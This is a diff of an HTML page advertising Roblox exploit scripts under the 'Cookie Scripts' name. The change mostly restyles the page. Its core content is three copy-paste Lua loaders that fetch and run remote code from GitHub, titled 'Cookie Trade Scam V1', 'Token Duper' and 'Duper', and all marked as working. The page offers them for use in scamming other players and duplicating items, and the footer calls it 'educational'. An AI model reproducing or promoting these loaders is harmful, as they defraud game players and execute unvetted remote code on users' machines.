@@ -8,88 +8,79 @@
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
 
 body{
-  background:linear-gradient(120deg,#0a0d2a,#070414,#02030a);
+  background:radial-gradient(circle at top,#1a1a3d,#050510);
   color:#fff;
   overflow-x:hidden;
 }
 
+/* animated background */
 body::before{
   content:"";
   position:fixed;
   inset:0;
   background:url("https://www.transparenttextures.com/patterns/stardust.png");
-  opacity:.18;
-  animation:bgMove 60s linear infinite;
+  opacity:.2;
+  animation:float 60s linear infinite;
   z-index:-1;
 }
-
-@keyframes bgMove{
+@keyframes float{
   from{background-position:0 0}
   to{background-position:1200px 1200px}
 }
 
+/* hero */
 .hero{
-  padding:80px 20px 50px;
+  padding:70px 20px 50px;
   text-align:center;
 }
-
 .hero h1{
-  font-size:36px;
+  font-size:34px;
   font-weight:700;
 }
-
 .hero h1 span{
-  background:linear-gradient(90deg,#7b6cff,#c77dff);
+  background:linear-gradient(90deg,#8b7bff,#c59bff);
   -webkit-background-clip:text;
   -webkit-text-fill-color:transparent;
 }
-
 .hero p{
-  margin-top:14px;
-  color:#b8b8ff;
+  margin-top:12px;
+  color:#bdbdff;
   font-size:14px;
 }
 
-.credit{
-  margin-top:10px;
-  font-size:13px;
-  color:#9aa0ff;
-}
-
-.section{
+/* section */
+.container{
   max-width:1100px;
   margin:auto;
   padding:20px;
 }
-
 .section-title{
-  font-size:22px;
-  margin:30px 0 20px;
   display:flex;
   align-items:center;
   gap:12px;
+  margin:40px 0 20px;
+  font-size:22px;
 }
-
 .section-title::after{
   content:"";
   flex:1;
   height:1px;
-  background:linear-gradient(90deg,#7b6cff,transparent);
+  background:linear-gradient(90deg,#8b7bff,transparent);
 }
 
+/* cards */
 .card{
-  background:rgba(255,255,255,.06);
-  backdrop-filter:blur(20px);
+  background:rgba(255,255,255,0.06);
+  backdrop-filter:blur(18px);
   border-radius:22px;
-  padding:20px;
+  padding:22px;
   margin-bottom:25px;
-  box-shadow:0 0 40px rgba(123,108,255,.18);
-  animation:fadeUp .7s ease forwards;
+  box-shadow:0 0 40px rgba(139,123,255,.18);
+  animation:fadeUp .8s ease forwards;
 }
-
 @keyframes fadeUp{
   from{transform:translateY(25px);opacity:0}
   to{transform:none;opacity:1}
@@ -97,57 +88,71 @@ body::before{
 
 .card-header{
   display:flex;
-  gap:15px;
   align-items:center;
+  gap:15px;
 }
 
-.thumb{
-  width:70px;
-  height:70px;
+/* thumbnail + cookie badge */
+.thumb-wrap{
+  position:relative;
+  width:64px;
+  height:64px;
+}
+.thumb-wrap img{
+  width:100%;
+  height:100%;
   border-radius:16px;
-  object-fit:cover;
-  box-shadow:0 0 20px rgba(123,108,255,.4);
+}
+.cookie-badge{
+  position:absolute;
+  bottom:-6px;
+  right:-6px;
+  width:26px;
+  height:26px;
+  background:linear-gradient(135deg,#ffb703,#ff7a00);
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:14px;
+  box-shadow:0 0 15px rgba(255,183,3,.8);
 }
 
-.card h3{
-  font-size:18px;
-}
-
+/* status */
 .status{
   font-size:12px;
-  margin-top:5px;
+  margin-top:4px;
 }
-
 .working{color:#6bff9a}
 .patched{color:#ff6b6b}
 
+/* code */
 pre{
   margin-top:15px;
-  background:#030410;
+  background:#060616;
   padding:15px;
   border-radius:14px;
-  font-size:13px;
-  color:#c5c7ff;
   overflow-x:auto;
+  font-size:13px;
+  color:#cfcfff;
 }
 
+/* button */
 .btn{
+  margin-top:15px;
   width:100%;
-  margin-top:14px;
   padding:14px;
   border:none;
   border-radius:14px;
-  font-size:15px;
+  background:linear-gradient(135deg,#8b7bff,#c59bff);
+  color:white;
   font-weight:600;
   cursor:pointer;
-  background:linear-gradient(135deg,#7b6cff,#c77dff);
-  color:#fff;
   transition:.25s;
 }
-
 .btn:hover{
   transform:translateY(-2px);
-  box-shadow:0 10px 30px rgba(123,108,255,.5);
+  box-shadow:0 10px 30px rgba(139,123,255,.5);
 }
 
 footer{
@@ -162,84 +167,89 @@ footer{
 <body>
 
 <div class="hero">
-  <h1>Unlock the <span>Power</span><br>of Advanced Scripts</h1>
-  <p>Smooth • Mobile-Friendly • Regularly Updated</p>
-  <div class="credit">
-    Scripts powered by <b>Cookie Scripts</b><br>
-    Interface crafted independently
-  </div>
+  <h1>Powering the <span>Next Wave</span><br>of Roblox Scripts</h1>
+  <p>Curated • Tested • Cookie-Verified 🍪</p>
 </div>
 
-<div class="section">
-  <div class="section-title">Working Scripts</div>
+<div class="container">
 
-  <!-- SCRIPT 1 -->
-  <div class="card">
-    <div class="card-header">
-      <img src="thumb.jpg" class="thumb">
-      <div>
-        <h3>Cookie Trade Scam V1</h3>
-        <div class="status working">● WORKING</div>
-      </div>
+<div class="section-title">Working Scripts</div>
+
+<!-- SCRIPT 1 -->
+<div class="card">
+  <div class="card-header">
+    <div class="thumb-wrap">
+      <img src="https://i.imgur.com/8Km9tLL.png">
+      <div class="cookie-badge">🍪</div>
     </div>
-
+    <div>
+      <h3>Cookie Trade Scam V1</h3>
+      <div class="status working">● WORKING</div>
+    </div>
+  </div>
 <pre id="s1">loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/TradescamV1/refs/heads/main/cookiescripts.lua"))()</pre>
 <button class="btn" onclick="copy('s1')">Copy Script</button>
-  </div>
+</div>
 
-  <!-- SCRIPT 2 -->
-  <div class="card">
-    <div class="card-header">
-      <img src="thumb.jpg" class="thumb">
-      <div>
-        <h3>Cookie Script Token Duper</h3>
-        <div class="status working">● WORKING</div>
-      </div>
+<!-- SCRIPT 2 -->
+<div class="card">
+  <div class="card-header">
+    <div class="thumb-wrap">
+      <img src="https://i.imgur.com/8Km9tLL.png">
+      <div class="cookie-badge">🍪</div>
     </div>
-
+    <div>
+      <h3>Cookie Script Token Duper</h3>
+      <div class="status working">● WORKING</div>
+    </div>
+  </div>
 <pre id="s2">loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Tokenduper/refs/heads/main/Cookiescripts.lua"))()</pre>
 <button class="btn" onclick="copy('s2')">Copy Script</button>
-  </div>
+</div>
 
-  <!-- SCRIPT 3 -->
-  <div class="card">
-    <div class="card-header">
-      <img src="thumb.jpg" class="thumb">
-      <div>
-        <h3>Cookie Scripts Duper (ETFB)</h3>
-        <div class="status working">● WORKING</div>
-      </div>
+<!-- SCRIPT 3 -->
+<div class="card">
+  <div class="card-header">
+    <div class="thumb-wrap">
+      <img src="https://i.imgur.com/8Km9tLL.png">
+      <div class="cookie-badge">🍪</div>
     </div>
-
+    <div>
+      <h3>Cookie Scripts Duper (ETFB)</h3>
+      <div class="status working">● WORKING</div>
+    </div>
+  </div>
 <pre id="s3">loadstring(game:HttpGet("https://raw.githubusercontent.com/luacoder312/Cookiescriptsduper/refs/heads/main/cookiescripts.lua"))()</pre>
 <button class="btn" onclick="copy('s3')">Copy Script</button>
-  </div>
+</div>
 
-  <div class="section-title">Patched</div>
+<div class="section-title">Outdated</div>
 
-  <!-- PATCHED -->
-  <div class="card">
-    <div class="card-header">
-      <img src="thumb.jpg" class="thumb">
-      <div>
-        <h3>Escape Tsunami For Brainrot</h3>
-        <div class="status patched">● PATCHED / OUTDATED</div>
-      </div>
+<!-- PATCHED -->
+<div class="card">
+  <div class="card-header">
+    <div class="thumb-wrap">
+      <img src="https://i.imgur.com/8Km9tLL.png">
+      <div class="cookie-badge">🍪</div>
     </div>
-
-<pre>Script no longer supported</pre>
+    <div>
+      <h3>Escape Tsunami For Brainrot</h3>
+      <div class="status patched">● PATCHED / OUTDATED</div>
+    </div>
   </div>
+<pre>Script disabled</pre>
+</div>
 
 </div>
 
 <footer>
-© 2026 Cookie Scripts • Custom Premium UI
+© 2026 Cookie Scripts • Built for showcase & educational purposes
 </footer>
 
 <script>
 function copy(id){
   navigator.clipboard.writeText(document.getElementById(id).innerText);
-  alert("Script copied!");
+  alert("Copied 🍪");
 }
 </script>
 
